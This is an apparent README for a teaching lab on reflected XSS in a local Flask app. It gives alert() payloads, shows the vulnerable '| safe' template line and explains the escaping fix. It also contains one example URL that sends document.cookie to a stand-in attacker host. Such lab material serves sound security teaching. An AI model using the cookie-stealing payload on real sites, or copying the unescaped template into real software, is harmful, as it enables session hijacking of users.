# Reflected XSS (Cross-Site Scripting)

## What is Reflected XSS?

Imagine receiving an email that says "click here to claim your prize" and the
link takes you to a real, legitimate website you trust — but hidden inside the
URL is a malicious script that executes the moment the page loads. That is
Reflected XSS.

Unlike Stored XSS, the script is never saved in the database. It lives inside
the URL itself and gets "reflected" back to the victim by the server. The attack
only affects whoever clicks the malicious link, but that is exactly how attackers
use it — they craft a weaponized URL and send it to victims via email, messages
or social media.

---

## How to Run
```
cd vulnerable/xss_reflected
python app.py
```

Then open http://127.0.0.1:5005 in your browser.

---

## Trying the Exploit

### Step 1 - Normal search
First try a normal search to see how the app works:
- Search for: `hello`

The page reflects your search term back with "Showing results for: hello."
This is normal behavior.

### Step 2 - Inject via the search box
Now type this into the search bar:
```
<script>alert('XSS!')</script>
```

An alert popup appears. The script was reflected back from your input and
executed by the browser.

### Step 3 - Inject via the URL (the real attack method)
This is how attackers actually deliver Reflected XSS in the real world.
Paste this directly into your browser address bar:
```
http://127.0.0.1:5005/search?q=<script>alert('XSS!')</script>
```

The alert fires again. An attacker would send a link exactly like this to
a victim. The victim sees a familiar looking URL pointing to a real website
they trust and clicks it — the script executes in their browser instantly.

---

## Why Does This Work?

Here is the vulnerable line in the template:
```html
<p class="search-info">Showing results for: {{ query | safe }}</p>
```

The app takes whatever is in the URL parameter `q` and reflects it directly
back into the page using the `| safe` filter. This tells Flask to render the
content as raw HTML, so any script tag in the URL gets executed by the browser.

The server never checks whether the input is a legitimate search term or a
malicious script. It just reflects it back as is.

---

## Real World Impact

Reflected XSS is one of the most commonly reported vulnerabilities in bug
bounty programs. In real attacks it is used to:

- **Session hijacking** — stealing the victim's session cookie to take over their account
- **Credential harvesting** — redirecting the victim to a fake login page
- **Malware distribution** — redirecting the victim to a site that downloads malware
- **Bypassing CSRF protections** — using the victim's browser to perform actions on their behalf

A real attack URL for cookie theft would look like this:
```
http://vulnerablesite.com/search?q=<script>document.location='https://attacker.com?c='+document.cookie</script>
```

The attacker shortens this URL with a service like bit.ly to hide the payload
and sends it to the victim.

---

## Stored vs Reflected XSS

| | Stored XSS | Reflected XSS |
|---|---|---|
| Script saved in database | Yes | No |
| Affects all visitors | Yes | No, only whoever clicks the link |
| Requires victim interaction | No | Yes, victim must click the link |
| Harder to detect | Yes | No, visible in URL |

---

## The Fix - Output Encoding

Compare these two lines in the templates:

Vulnerable `vulnerable/xss_reflected/templates/search.html`:
```html
<p class="search-info">Showing results for: {{ query | safe }}</p>
```

Secure `secure/xss_reflected/templates/search.html`:
```html
<p class="search-info">Showing results for: {{ query }}</p>
```

The secure version also sanitizes the input in `app.py` before passing
it to the template:
```python
safe_query = html.escape(query)
```

This converts `<script>` into `&lt;script&gt;` which the browser displays
as plain text instead of executing as code. No matter what is in the URL,
it will never be treated as HTML.

---

## Key Takeaway

Never reflect user input back into a page without sanitizing it first.
Always use your templating engine's auto-escaping and never use the `| safe`
filter on user controlled data. Be especially careful with URL parameters,
form inputs, and HTTP headers — all of these can carry malicious payloads.

---

## Further Reading

- [OWASP Reflected XSS](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks)
- [PortSwigger Reflected XSS Labs](https://portswigger.net/web-security/cross-site-scripting/reflected)